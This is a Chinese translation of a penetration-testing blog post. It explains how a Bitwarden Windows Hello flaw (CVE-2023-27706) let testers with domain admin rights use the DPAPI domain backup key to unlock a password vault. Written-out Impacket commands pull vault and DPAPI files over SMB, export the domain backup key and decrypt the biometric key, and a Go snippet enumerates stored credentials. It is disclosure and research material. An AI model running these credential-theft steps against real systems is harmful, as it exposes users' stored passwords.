<!--yml

分类：未分类

date: 2024-05-27 14:28:33

-->

# RedTeam Pentesting - Blog - Bitwarden 抢劫 - 如何在不使用密码的情况下破解密码保险库

> 来源：[`blog.redteam-pentesting.de/2024/bitwarden-heist/`](https://blog.redteam-pentesting.de/2024/bitwarden-heist/)

#### 2024 年 1 月 3 日

## Bitwarden 抢劫 - 如何在不使用密码的情况下破解密码保险库

有时，做出特定的安全设计决策可能会带来意想不到的后果。对于像密码管理器这样的安全关键软件，这很容易导致灾难性的失败：在这篇博文中，我们展示了[Bitwarden](https://bitwarden.com/)的 Windows Hello 实现如何允许我们远程窃取保险库中的所有凭据，而无需知道密码或需要生物识别身份验证。当我们在一次渗透测试中发现这一点时，对我们来说是如此意外，以至于我们同客户商定发表一篇关于此事的博文并讲述这个故事。

**这个潜在问题已经在 2023 年 4 月的 Bitwarden v2023.4.0 中得到了修正**（但这个故事仍然很有趣）。

### 我们的起点

我们最近进行了一次渗透测试，旨在入侵 Windows 环境中客户的内部网络。像往常一样，我们设法获得了对域控制器的管理访问权限，但是，还有一个额外的障碍：备份服务器，这是一个优先考虑的目标之一，不在域内。已经获得域管理员帐户访问权限后，我们决定查看他们的 Windows 工作站，希望发现可以让我们访问备份系统的信息。查看工作站时，我们发现密码似乎是使用 Bitwarden 存储的（以下详细信息适用于软件的版本 [Desktop v2023.3.0](https://github.com/bitwarden/clients/releases/tag/desktop-v2023.3.0)）。我们假设备份系统的凭据可能在负责 IT 基础设施的员工的 Bitwarden 保险库中找到。在与客户协商后，我们获得了尝试检索其中一个保险库内容的许可。由于我们不想通过使用侵入性技术（如键盘记录器）来获取访问备份系统的权限而可能干扰客户的业务，因此我们寻找了一种不依赖于最终用户交互的非侵入方式，如果可能的话。

我们首先尝试使用简单的凭据填充攻击来破解保险库，但是这仍然没有成功，最终导致我们尝试了一种更具创造性的方法。为了进一步分析保险库，我们决定下载 Bitwarden 的主存储文件，希望能找到任何值得注意的内容。它位于用户的主目录下的 `%AppData%\Bitwarden\data.json`。下载 JSON 文件并在文本编辑器中打开后，我们发现了一个意外的发现：

```
 "openAtLogin": false,  "enableBiometrics": true,  "biometricText": "unlockWithWindowsHello",  "noAutoPromptBiometricsText": "autoPromptWindowsHello",  "installedVersion": "2023.3.0", [...]  "avatarColor": null,  "biometricUnlock": true  },  "tokens": { 
```

似乎这个 Bitwarden 保险库可以使用生物识别技术打开，尤其是 Windows Hello。我们觉得值得一看，所以我们决定深入挖掘。

### 生物识别解锁 - 如何工作？

即使启用了生物识别技术，保险库仍然有一个主密码（Bitwarden 称之为[主密码](https://bitwarden.com/help/master-password/)），你不必总是输入它来解锁保险库。这引出了一个问题，即如果您不必输入主密码，保险库是如何安全的。嗯，保险库实际上并没有用主密码加密，而是用一个*帐户加密密钥*加密，该密钥本身以加密形式存储在保险库中。解密*帐户加密密钥*的关键是从创建保险库时选择的*主密码*派生的。

*换句话说：* 当用户输入他们的主密码时，Bitwarden 从密码派生一个密钥，然后使用这个密钥来解密实际的*帐户加密密钥*，然后可以解密保险库中存储的凭据。

从*主密码*派生的密钥从现在开始将被称为*派生密钥*，这正是生物识别解锁发挥作用的地方。在这一点上，用户可以选择添加其他解锁机制，这通常会导致将*派生密钥*的加密副本存储在一个（希望是）安全的位置，从中可以使用生物识别技术检索它，例如。因此，谁可以检索和解密*派生密钥*就不需要密码来访问保险库。

已描述的生物识别解锁是基于 Windows 机器上的 Windows Hello 实现的。因此，在 Windows 上激活生物识别登录意味着使用可以在 Windows Hello 通过身份验证后检索的秘密对本地加密*派生密钥*。到目前为止，一切都很顺利，但事实证明，非常值得仔细研究这实际上是如何在 Bitwarden 中实现的。

经过一番搜索，我们发现 Bitwarden 使用 Windows 凭据 API 来存储*派生密钥*的加密副本，通过调用[`windows::win32::Credentials::CredWriteW`](https://learn.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credwritew)在 [bitwarden/clients Rust 代码](https://github.com/bitwarden/clients/blob/7f25f5f6ecc47ae3354b60e6ba6158f8be185a8d/apps/desktop/desktop_native/src/password/windows.rs#L110)中。不幸的是，关于这些凭据如何受保护的文档非常少，可以说是很少，这使得在实际使用 API 时理解发生了什么变得复杂。看起来，`CredWriteW` 创建凭据时使用 [凭据管理器](https://stackoverflow.com/a/9228105)，而凭据管理器似乎又调用了低级别的数据保护 API ([DPAPI](https://learn.microsoft.com/en-us/windows/win32/seccng/cng-dpapi))。DPAPI 提供了一种方便的方式来[安全存储数据](https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata)，以便仅有给定用户能在以后的某个时间点检索到数据。通过凭据管理器保护凭据和 DPAPI 之间的区别有些不清楚，但是使用凭据管理器似乎比使用低级别 API 提供了[额外的好处](https://stackoverflow.com/a/9228105)，例如 UI 可见性（您可以通过在 Windows 开始菜单中搜索`Credential Manager`应用程序来自行测试这一点）。

为了解密 Bitwarden 保险库，我们要么需要知道主密码以便即时推导出*派生密钥*，要么我们需要从加密的 DPAPI 存储的深处检索*派生密钥*。我们知道 DPAPI 与 Active Directory 有很多联系，这对于加入域的工作站很重要，我们已经妥协了客户的 Active Directory，所以我们选择了后一种方法。

### 远程劫掠保险库 - 谁需要主密码呢？

我们很快了解到 DPAPI 的一个[非常方便的功能](https://learn.microsoft.com/en-us/windows/win32/seccng/cng-dpapi-backup-keys-on-ad-domain-controllers)，或者说它的新版本[DPAPI-NG](https://learn.microsoft.com/en-us/windows/win32/seccng/cng-dpapi)，在加入域的工作站上：

> 通常，域用户使用从自己密码派生出的密钥加密 DPAPI 受保护的数据。但是，如果用户忘记了密码，或者他们的密码被管理重置或从其他设备重置，以前加密的数据将无法使用从用户新密码派生的新密钥进行解密。当这种情况发生时，数据仍然可以使用存储在 Active Directory 域控制器上的备份密钥进行解密。然后，可以使用用户的新密码派生的密钥重新加密数据。这意味着任何人只要拥有域的 DPAPI 备份密钥，即可解密任何域用户的 DPAPI 加密数据，即使用户的密码已更改。

这意味着数据是使用域用户的密码加密的，而不需要 Windows Hello 直接参与解密（只要知道用户的密码）。此外，数据还可以使用存储在域控制器上的[远程备份密钥](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/)进行解密。可能会出现什么问题呢？

由于运行 Bitwarden 的工作站已加入域，而域已经受到了威胁，因此我们开始寻找 DPAPI 密钥以利用此机制。首先，我们需要获取机器上 DPAPI 存储的任何内容。

我们很快发现两个目录对我们特别重要：`%AppData%\Microsoft\Protect`，用于安全存储*DPAPI 解密密钥*，以及`%AppData%\Microsoft\Credentials`，其中存放着*受保护的数据*。请注意，我们在 DPAPI 中使用了一些简化，涉及到会话密钥的创建，因为它们与本博客文章无关；详情请参见[这里](https://learn.microsoft.com/en-us/previous-versions/ms995355(v%3Dmsdn.10))。

如果您在资源管理器中打开这些目录，您将看不到任何内容，因为它们被隐藏了，资源管理器甚至不会在启用“显示隐藏文件”时显示它们。但是，PowerShell 命令`Get-ChildItem`或`gci`在添加`--force`或`--hidden`时可以显示它们。它们也可以通过 SMB 可见，因为我们已经具有远程管理员访问权限，所以我们选择了这条路径。

以下代码片段取自我们的实验环境，但与实际的渗透测试密切相关。首先，我们使用[Impacket 项目](https://github.com/fortra/impacket)中的`smbclient`获取所需的 Bitwarden 数据文件：

```
$ smbclient.py 'LAB/Administrator:<password>@workstation.lab'
Impacket v0.10.0.post1+20230417.105142.28de12f1 - Copyright 2022 Fortra

Type help for list of commands
# use C$
# get \Users\user1\AppData\Roaming\Bitwarden\data.json 
```

在同一个会话中，我们还下载了`Credentials`和`Protected`数据：

```
# cd \Users\user1\AppData\Roaming\Microsoft\Credentials\
# ls
drw-rw-rw-          0  Tue Nov 28 12:59:46 2023 .
drw-rw-rw-          0  Tue Nov 28 12:59:46 2023 ..
-rw-rw-rw-        686  Tue Nov 28 14:02:38 2023 C6530B1481D73604A6A51D114372F1AA
# get C6530B1481D73604A6A51D114372F1AA
# cd ..
# cd Protect
# ls
drw-rw-rw-          0  Mon Nov 27 09:59:01 2023 .
drw-rw-rw-          0  Mon Nov 27 09:59:01 2023 ..
-rw-rw-rw-         24  Mon Nov 27 09:58:51 2023 CREDHIST
drw-rw-rw-          0  Mon Nov 27 09:58:51 2023 S-1-5-21-505269936-2602674991-4082112561-1105
-rw-rw-rw-         76  Mon Nov 27 09:59:01 2023 SYNCHIST
# cd S-1-5-21-505269936-2602674991-4082112561-1105
# ls
drw-rw-rw-          0  Mon Nov 27 09:58:51 2023 .
drw-rw-rw-          0  Mon Nov 27 09:58:51 2023 ..
-rw-rw-rw-        740  Mon Nov 27 09:58:51 2023 14c8d0db-8c7c-4bf8-a857-eb20500a3893
-rw-rw-rw-        904  Mon Nov 27 09:58:51 2023 BK-LAB
-rw-rw-rw-         24  Mon Nov 27 09:58:51 2023 Preferred
# get 14c8d0db-8c7c-4bf8-a857-eb20500a3893
# exit 
```

下载这些文件使得我们可以在本地工作解密过程，但这也意味着我们没有直接获得用户的主解密密码。 这就是备份密钥解密 DPAPI 解密密钥的方便功能发挥作用的地方，因为我们知道可以使用域控制器的备份密钥解密这些本地密钥。 我们可以使用来自[Impacket 项目](https://github.com/fortra/impacket)的`dpapi.py`脚本方便地下载它：

```
$ dpapi.py backupkeys -t 'LAB/Administrator:<password>@dc.lab' --export 
```

在这种情况下，我们将密钥重命名为`backupkey.pvk`。 使用这个新获得的密钥，我们可以从工作站解密受保护的 DPAPI 解密密钥开始：

```
$ dpapi.py masterkey -pvk backupkey.pvk -file ./14c8d0db-8c7c-4bf8-a857-eb20500a3893 Impacket v0.10.0.post1+20230417.105142.28de12f1 - Copyright 2022 Fortra   [MASTERKEYFILE] Version     :        2 (2) Guid        : 14c8d0db-8c7c-4bf8-a857-eb20500a3893 Flags       :        0 (0) Policy      :        0 (0) MasterKeyLen: 00000088 (136) BackupKeyLen: 00000068 (104) CredHistLen : 00000000 (0) DomainKeyLen: 00000174 (372)   Decrypted key with domain backup key provided Decrypted key: 0xad69553beafe0c5bcaf3b61a61136da64c50c57406f3649c6f70c11dc8d22a09d87241bd769ddbcb022a64744cbcd28342176593da30c825a0a56105496f0d5a 
```

现在只是简单地使用此密钥解密生物识别登录凭据，这些凭据是进入 Bitwarden 保险库所必需的：

```
$ dpapi.py credential -f ./C6530B1481D73604A6A51D114372F1AA -key 0xad69553beafe0c5bcaf3b61a61136da64c50c57406f3649c6f70c11dc8d22a09d87241bd769ddbcb022a64744cbcd28342176593da30c825a0a56105496f0d5a Impacket v0.10.0.post1+20230417.105142.28de12f1 - Copyright 2022 Fortra   [CREDENTIAL] LastWritten : 2023-11-28 14:02:38 Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH) Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE) Type        : 0x00000001 (CRED_TYPE_GENERIC) Target      : LegacyGeneric:target=Bitwarden_biometric/ea0b6061-4381-4534-9e91-50cf98753530_masterkey_biometric Description : Unknown     : Username    : ea0b6061-4381-4534-9e91-50cf98753530_masterkey_biometric Unknown     : "6PN6Y9wkXjrHvDCijM7fhkNrDL8PI/dc70m9XoSqxDE=" 
```

这显示了*生物识别密钥*（先前描述的*派生密钥*的副本），该密钥授予对 Bitwarden 保险库的访问权限：`6PN6Y9wkXjrHvDCijM7fhkNrDL8PI/dc70m9XoSqxDE=`

这意味着我们不需要主密码，不需要生物识别指纹，甚至不必使用键盘记录器或转储 Bitwarden 的进程内存。 这也意味着我们不必与端点保护抗争，也不必等待实际用户解锁保险库。 我们只需按照设计使用 DPAPI。 我们严重怀疑任何用户在为其保险库启用 Windows Hello 时都意识到了这些含义。

到目前为止，我们只展示了足以解密保险库的*派生/生物识别密钥*。 但实际上，我们还有一点工作要做。 毕竟，我们的目标不是证明我们*可以*解密保险库，而是从保险库获取实际的凭据。

### 突破保险库

我们首先需要弄清楚如何解密 Bitwarden *账户加密密钥*，该密钥保护了保险库中的所有其他信息。 凭证并非始终直接使用*账户加密密钥*加密，因为 Bitwarden 还支持某些凭证应在组织中共享的使用场景，例如。 这是通过添加额外的密钥层（私人和组织密钥）来解决的，这些密钥用于加密组织凭证，并且也受到*账户加密密钥*的保护。 如果您开始对此故事中涉及的所有密钥感到困惑，请看下面的图。

因此，解密过程主要包括三个主要步骤：(1) 使用*生物识别密钥*解密*账户加密密钥*，(2) 使用*账户加密密钥*解密第二层密钥，以及(3) 使用*账户加密密钥*或其中一个中间密钥解密凭证。 然后我们开始编写一个 Python 脚本来自动解密。 让我们逐步进行：

1.  我们首先从 Bitwarden 数据文件 `data.json` 中提取了用户对象。用户对象包含加密凭据（在`data`部分）和加密密钥（在`keys`部分）以及用户帐户的（未加密）信息，如电子邮件地址（`profile`）、设置如在线保险库 URL（`settings`）等等。可以通过搜索用作 JSON 对象中键的 UUID 来识别用户部分：

    ```
    "ea0b6061-4381-4534-9e91-50cf98753530": {  "data": { [...] "keys": { "cryptoSymmetricKey": { "encrypted": "2.Z9+7NUlzujEYKrRX+x22+A==|rB5YmxVMKo9tJtNSmRT8mpVQu7GEAHhKndJBXKBwWfW1rw6i3x003ZPligtJCmWXpdHIryF2fb5KdETAvr9QLws27A8z3ZAO4KNAgrzGH14=|PuD7z8am9+l09gM8SDFUU8hvFa02x30gYqJXe7Ac6mI=" }, [...] 
    ```

    由于 Bitwarden 对不同的情景使用不同类型的加密，所有加密值都以特定格式存储，该格式以 *加密类型* 标识符开始（[来自 GitHub](https://github.com/bitwarden/clients/blob/master/libs/common/src/platform/enums/encryption-type.enum.ts)）：

    ```
    export enum EncryptionType {  AesCbc256_B64 = 0, AesCbc128_HmacSha256_B64 = 1, AesCbc256_HmacSha256_B64 = 2, Rsa2048_OaepSha256_B64 = 3, Rsa2048_OaepSha1_B64 = 4, Rsa2048_OaepSha256_HmacSha256_B64 = 5, Rsa2048_OaepSha1_HmacSha256_B64 = 6, }   /** [...]  * Example of annotated serialized EncStrings: * 0.iv|data * 1.iv|data|mac * 2.iv|data|mac * 3.data * 4.data [...] 
    ```

    正如前面的 2 所示，我们的账户加密密钥使用 AES-CBC-256 进行加密，并且使用基于 SHA-256 的 HMAC 进行完整性保护。在使用生物特征密钥解密账户密钥之前，必须扩展该密钥，使用 [HKDF-expand](https://en.wikipedia.org/wiki/HKDF) 进行扩展。

1.  使用账户加密密钥，我们能够解密第二层密钥，这些密钥也都存储在用户对象的`"keys"`部分中。

    ```
     "privateKey": { "encrypted": "2.JbYuUgAf3yIDWfKAZdAi7w==|7OHkUd5GY5akE7IqLGRfJW4cL6P9KltcJOhLepjGPsyOBt0Jzr5+PPakvp8Fz3pgAYNXszCqDP8aqz/q+JhsZVtx5VP3OE6KINdmBvWEO0EX0PEMxtI08WiDNKadlFgNG9zyotIsA+6MA0cDwMIdKYPUWv7P3JB2Y0W9jlqeQQkPerg3voEvGLHOUa48xv7hJt3Q8fIPH3yoo9i5UN042QNEBmn9GBYdFw0gMNdDvMnK47j8kHQ+18SBMpIG0tjLylEmN0aA1QOXq9XHaorguOowUaLQU5funOiurFPpXv7CuXdlJiYak8nBQjdEj9euAEKe4himejHak0CUwMsNqqF7HdAhpLdGLY/gtskd/2e9v8Gwq93nBGNfRBTtfO8tWRWf+ygFqninfR9QquIHQ7BPJMHXsupoOUFlwNV7RVrG1Qa64sv0k1ksP38GyY8jzU2YZVsLWPjwHdHwXIeZzwC2CQ7JO6x9i/zkT9GJIEMBRAf6WBcIy0Q8J1LZvzlIEAJDqZaungjfwKDovaJVCHAq4WTaM0SyNj01RNARsLbVCweGlx1eQ6jootNdovOTR4jprmWwyfe9FQf9Xabm40Bwx8E2jZY2TxyS+Y0TzhdO3Rg0gETb8GHIlXeTU28fPVusjopv0eZXwe97NQhvyhDXCrZM7/546rCIvWTdcmouKdQEaXUXe02nuJl8UGjqqLuuKNxFfNez+RY7khCf7xU5wXzoC/90pNP1nM0FkB9IPe/J7EUvhBHrD+dP+6SxJ9mPDByN/u68kvBeu8R3dn234zJiqDNFWtmliGJMrYybzmViHI70tDxInv/9KoJfJK6QD+SypcEJjytZm+U8kEaWHkaxyMMUQIaHdmmhDYixjC6iclZWvAk5nMhf0wQm5NJJdfIQTWoID4kOMoS71OXExVkLVm93O5AflyD5jcWu/z6IThDY7nEg35t2ziRM1djkhnkK0Eunp45u/bpfhwYsMCnM8IJEiZ9kOOkFfCWCOZJwsk2uINmTBp8PKJD06sluhFKdOFtEDP7PMhEKVt2D2a1yMPT4PCdLYiSe18PQloUgBWC8ica4BVcGnTjGKkloqLNHF8T4nd1igW+LL+FbAj4DVJVciTV6hdHhdf0xmIoz+OhvIfzrmYxy5hjJjmesSvZq8FuK6G746cFCIQmGjT7lZuQcaR2msWawsIEcjFFFy6vIRiwQo72yeyCAmDEbgETLjSfs3jrhXf8pvcEWuci8bpsOV1zr+Od60OU+/30cFal2guazAlIT2jF+zvpf+qWC/A7lVu0iroTAoXu8/IOLxLpaF+xSso7kbrNbsKyx2fJuhNdTLOrqvnv4rw+73n11/fhF3506eN3ULj57kGFIKnRIkueMMwS7DIMla8BPT1rrUNZarTyDupF63KSjJbG9nPXneBeWjHi43jsW78PMtndfqrAr9pn02Me9vYGl8nhseEGArR3iN2fTkrWbV3wwjTbMnGfk4Z43fhsAKaGet6gjmLmcGhbeC2wSEAFgTnoMLZM/CUcqFBopyvMNVkAUs495qZCNvqgpT5f7DrJuzq+GbHK8fypdF+qxwUeUyDzFQfTvf1gKc+ISDYN0mXqDNH1II5aMu/4j0U4gvlO9vxKfJxms2tq0WGY=|3AsNkNSpAWpyHBSa2gjkJHff5vqnoU1yysEmLeXbgYc=" } 
    ```

    正如可以从加密类型推断的那样，该密钥也使用 AES-CBC 进行了加密。在我们的测试设置中，私有 RSA 密钥可用于解密额外的组织密钥，而这些密钥又被需要来访问特定于组织的凭据。

1.  在获取了所有中间密钥之后，我们终于能够提取所需的凭据：

    ```
    "46d9d1c2-7595-4c18-989d-053e1bf5336f": {  "id": "46d9d1c2-7595-4c18-989d-053e1bf5336f", "organizationId": null, [...] "login": { "username": "2.K+/iMJyO27Wzqos4JtTfmA==|FB1cyKstIHGPBx4GBRk651FZ1zr3NpLBEoe1Vf3FFe4=|Y/2Kur7jIvI/ecXA64ARKs6qy7zLXJh9NVC81+uyeiI=", "password": "2.ALOh5YroSqPCkoyzviK0/g==|FDzMel84he7OPGGLatBgxw==|fVxA3OIeNkLwH3zzDU66F40ykDD0PGUOBSEcpMlp3w8=", [...] 
    ```

    这种类型的凭据可以直接使用账户密钥解密（可通过空的`organizationId`进行识别）。

    其他凭据需要中间密钥（`organizationId` 已设置）：

    ```
    "fad536b0-0b44-4cf2-8741-bca6ce7881d0": {  "id": "fad536b0-0b44-4cf2-8741-bca6ce7881d0", "organizationId": "1d05eff7-8a52-44b1-a004-9835dc485985", [...] "login": { "username": null, "password": "2.qiVz94La8KSO+GaLbUHjGw==|Khqd0v88X8SqC2gTTrQMtQ==|PYFaG7+X9rL8LZUzbo1T3xIATDAOlybnN3tviBST3/c=", [...] 
    ```

现在我们可以看到我们的 [保险库解密脚本](https://github.com/RedTeamPentesting/bitwarden-windows-hello/blob/main/hello-bitwarden.py) 在执行中：

正如我们所希望的那样，管理员工作站上的 Bitwarden 保险库确实包含了访问特殊备份系统的凭据，最终授予了我们访问所需备份的权限。当我们告诉客户有关攻击时，他们可能会感到震惊，因为他们不知道域管理员可以绕过 Bitwarden 的保险库保护。

嗯，我们一直都知道拥有域管理员权限的攻击者本来就很强大，但至少保险库受到了保护，以防止在本地工作站上没有特权的攻击者，对吗？&mldr;对吗？

### 但等等，还有更多：谁需要生物识别，不是吗？

在试图理解整个机制的过程中，我们开始在我们的实验室环境中尝试使用 DPAPI。例如，我们认为使用 API 本身可能比从 `%AppData%` 中拼凑密钥文件更容易。为了熟悉 DPAPI，我们编写了一个小小的 Go 程序，使用 [wincred](https://github.com/danieljoos/wincred) 库来查看工作站上存储在 DPAPI 中的凭据。完整的脚本可以在[这里](https://github.com/RedTeamPentesting/bitwarden-windows-hello/blob/main/dpapidump/main.go)找到，但是唯一有趣的行是这些：

```
creds, err := wincred.List() if err != nil {  return fmt.Errorf("wincred list: %w", err) }   for _, cred := range creds {  credentialBlob, err := decodeUTF16LE(cred.CredentialBlob) if err != nil { credentialBlob = fmt.Sprintf("%q", string(cred.CredentialBlob)) }    fmt.Printf("%s:\n    * %s\n", cred.UserName, credentialBlob) } 
```

它只调用了 `windcred.List()`，这是围绕 [CredEnumerateW](https://learn.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratew) 的一个薄的 Go 包装器，它简单地“从用户的凭据集中枚举凭据”。然而，我们没有预料到这个函数会立即输出 Bitwarden 的*派生/生物特征密钥*，而不需要使用 Windows Hello 进行生物识别身份验证：

这意味着任何以低特权用户会话身份运行的进程都可以简单地请求 DPAPI 来获取解锁保险库的凭据，无需询问，也无需 PIN 码或指纹提示，甚至根本不涉及 Windows Hello。唯一的注意事项是，这对其他用户账户不起作用。

Bitwarden 本身在解锁保险库时确实会提示进行生物识别身份验证，但实际上它甚至都不需要。事实上，你可能只需从源代码中删除几行代码就可以让它在没有提示的情况下解锁。整个问题很可能是由于误解 `CredWriteW` 函数的细节，或者可能是对使用 DPAPI 存储加密密钥的潜在陷阱的无知所致。

### 一个特性，而不是一个 Bug

我们联系了 Bitwarden 和微软询问了这次攻击的详细信息。我们始终确保遵循负责任的披露行业最佳实践，即使我们的发现是否是实际漏洞尚不清楚。对于本文中解释的攻击，情况是这样的，因为尚不清楚攻击是否在 Bitwarden（因为攻击已经假定攻击者已经访问了受害者的工作站和 Windows 域）或者微软（他们只提供 DPAPI 来存储解密密钥）的范围内。微软确实通过声明 DPAPI 及其备份机制确实按照预期使用，并且我们的攻击因此没有表明他们一方存在任何漏洞而回应了我们的报告。

Bitwarden 也做出了回应，但他们同意这种行为是无意的，并表示他们已经在内部跟踪类似的问题。 结果证明，我们并不是 2023 年 3 月首次发现此问题，已经[通过 HackerOne 向 Bitwarden 报告](https://hackerone.com/reports/1874155)。 但是，我们不知道这一点，因为直到 2023 年 6 月才被披露。 自那时起，该漏洞被称为[CVE-2023-27706](https://nvd.nist.gov/vuln/detail/CVE-2023-27706)。

Bitwarden 自那时起已经对他们的代码库进行了更改，以缓解这种特定场景，我们将在下一节中简要总结。 他们还更改了使用 Windows Hello 作为登录功能时的默认设置，要求在启动 Bitwarden 时至少输入一次主密码。

### Bitwarden 现在的生物识别功能

为了准备这篇博客文章，我们还查看了当前版本的 Bitwarden [Desktop v2023.10.1](https://github.com/bitwarden/clients/releases/tag/desktop-v2023.10.1)中凭证是如何存储的。 Bitwarden 仍然使用 Windows Hello 和 DPAPI，仍然可以使用域备份密钥访问。 但是，安全数据块的内容已更改：

```
$ dpapi.py credential -f DAF81666731C8E899E9464647512792B -key 0xad69553beafe0c5bcaf3b61a61136da64c50c57406f3649c6f70c11dc8d22a09d87241bd769ddbcb022a64744cbcd28342176593da30c825a0a56105496f0d5a
Impacket v0.10.0.post1+20230417.105142.28de12f1 - Copyright 2022 Fortra

[CREDENTIAL]
LastWritten : 2023-11-28 15:01:47
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=Bitwarden_biometric/ea0b6061-4381-4534-9e91-50cf98753530_user_biometric
Description :
Unknown     :
Username    : ea0b6061-4381-4534-9e91-50cf98753530_user_biometric
Unknown     : 0.OQeotvzeRCpHoEb2c7TZ2g==|3PqjMDiq1J9hHnO7KESu0fG6Vl4yl2siOImoZghma2FpfNJmfKyGAmJNq00ay3/HV1dd855YMlNc7k3wSam47nxWEAuQU/oCaiPH9q5k9I+OJuvv01HVniqq7ERzRWLp

$ dpapi.py credential -f 1A52DC5CA68038A3E4216121AA1A7E0E -key 0xad69553beafe0c5bcaf3b61a61136da64c50c57406f3649c6f70c11dc8d22a09d87241bd769ddbcb022a64744cbcd28342176593da30c825a0a56105496f0d5a
Impacket v0.10.0.post1+20230417.105142.28de12f1 - Copyright 2022 Fortra

[CREDENTIAL]
LastWritten : 2023-11-28 15:01:47
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=Bitwarden_biometric/ea0b6061-4381-4534-9e91-50cf98753530_user_biometric_witness
Description :
Unknown     :
Username    : ea0b6061-4381-4534-9e91-50cf98753530_user_biometric_witness
Unknown     : 0.OQeotvzeRCpHoEb2c7TZ2g==|Kbo2ptPoXcw3N30AnYA8fw== 
```

现在，Bitwarden 不再通过 DPAPI 存储有价值的*派生/生物识别密钥*，而是存储了两个经过加密的安全数据块，这些数据块不能再直接用于解密*账户加密密钥*（表示为加密类型 0）。 存储的数据块现在还使用[KeyCredentialManager API](https://learn.microsoft.com/en-us/uwp/api/windows.security.credentials.keycredentialmanager)进行了额外加密，实际上需要与 Windows Hello 交互才能生成解密密钥。 虽然看起来这修复了问题，但我们实际上还没有测试新的实现是否存在其他漏洞。
